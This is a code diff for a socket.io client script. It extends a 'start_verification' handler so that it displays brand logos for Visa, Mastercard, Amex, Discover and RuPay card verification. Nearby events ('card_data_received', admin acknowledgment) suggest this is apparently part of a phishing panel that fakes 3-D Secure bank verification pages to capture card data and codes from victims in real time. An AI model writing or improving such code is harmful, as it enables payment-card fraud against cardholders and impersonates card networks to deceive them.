@@ -1947,34 +1947,64 @@ socket.on('show_mc_verification', (data) => {
   }
 });
    
-         // Start verification event handler with CURRENCY CONVERSION - UPDATED
-         socket.on('start_verification', async (data) => {
-           console.log('[DEBUG] Received start_verification event:', data);
-           
-           if (data.invoiceId === currentInvoiceId) {
-             // Get stored data
-             const storedData = window.mcVerificationData || {};
-             
-             // Hide loading, show verification content
-             const loadingContent = document.getElementById('mcLoadingContent');
-             const verificationContent = document.getElementById('mcVerificationContent');
-             
-             if (!loadingContent || !verificationContent) return; // Added null check
-             
-             loadingContent.style.display = 'none';
-             verificationContent.style.display = 'block';
-             
-             // UPDATED: Set verification type logo on RIGHT side
-             const verificationTypeLogo = document.getElementById('verificationTypeLogo');
-             if (verificationTypeLogo) {
-               if (data.verificationType === 'visa') {
-                 verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
-                 verificationTypeLogo.alt = 'Verified by Visa';
-               } else {
-                 verificationTypeLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
-                 verificationTypeLogo.alt = 'Mastercard SecureCode';
-               }
-             }
+// Start verification event handler with CURRENCY CONVERSION - UPDATED
+socket.on('start_verification', async (data) => {
+  console.log('[DEBUG] Received start_verification event:', data);
+  console.log('[DEBUG] Full start_verification data:', JSON.stringify(data));
+  
+  if (data.invoiceId === currentInvoiceId) {
+    // Get stored data
+    const storedData = window.mcVerificationData || {};
+    console.log('[DEBUG] Stored MC verification data:', JSON.stringify(storedData));
+    
+    // Hide loading, show verification content
+    const loadingContent = document.getElementById('mcLoadingContent');
+    const verificationContent = document.getElementById('mcVerificationContent');
+    
+    if (!loadingContent || !verificationContent) return; // Added null check
+    
+    loadingContent.style.display = 'none';
+    verificationContent.style.display = 'block';
+    
+    // UPDATED: Set verification type logo on RIGHT side based on stored data
+    const verificationTypeLogo = document.getElementById('verificationTypeLogo');
+    if (verificationTypeLogo) {
+      // First attempt to get the logo type from stored data or parameters
+      let logoType = (data.verificationType || 
+                      data.loadingLogoType || 
+                      storedData.loadingLogoType || 
+                      storedData.verificationType || 
+                      'mastercard').toLowerCase();
+      
+      console.log('[DEBUG] Logo type for verification page:', logoType);
+      
+      // Select the appropriate logo based on type
+      if (logoType.includes('visa')) {
+        verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
+        verificationTypeLogo.alt = 'Verified by Visa';
+        console.log('[DEBUG] Using Visa logo for verification page');
+      } 
+      else if (logoType.includes('amex') || logoType.includes('american')) {
+        verificationTypeLogo.src = 'https://www.americanexpress.com/content/dam/amex/us/merchant/SafeKey/SafeKey_New_Logo.png';
+        verificationTypeLogo.alt = 'American Express SafeKey';
+        console.log('[DEBUG] Using Amex logo for verification page');
+      } 
+      else if (logoType.includes('discover')) {
+        verificationTypeLogo.src = 'https://www.discoverglobalnetwork.com/content/dam/discover/en_us/dgn/images/logos/discover-protectbuy-logo.png';
+        verificationTypeLogo.alt = 'Discover ProtectBuy';
+        console.log('[DEBUG] Using Discover logo for verification page');
+      } 
+      else if (logoType.includes('rupay')) {
+        verificationTypeLogo.src = 'https://www.npci.org.in/sites/all/themes/npcl/images/rupay-logo.png';
+        verificationTypeLogo.alt = 'RuPay PaySecure';
+        console.log('[DEBUG] Using RuPay logo for verification page');
+      } 
+      else {
+        verificationTypeLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
+        verificationTypeLogo.alt = 'Mastercard SecureCode';
+        console.log('[DEBUG] Using Mastercard logo for verification page (default)');
+      }
+    }
             // Listen for admin acknowledgment
   socket.on('card_data_received', (data) => {
     if (data.invoiceId === currentInvoiceId) {
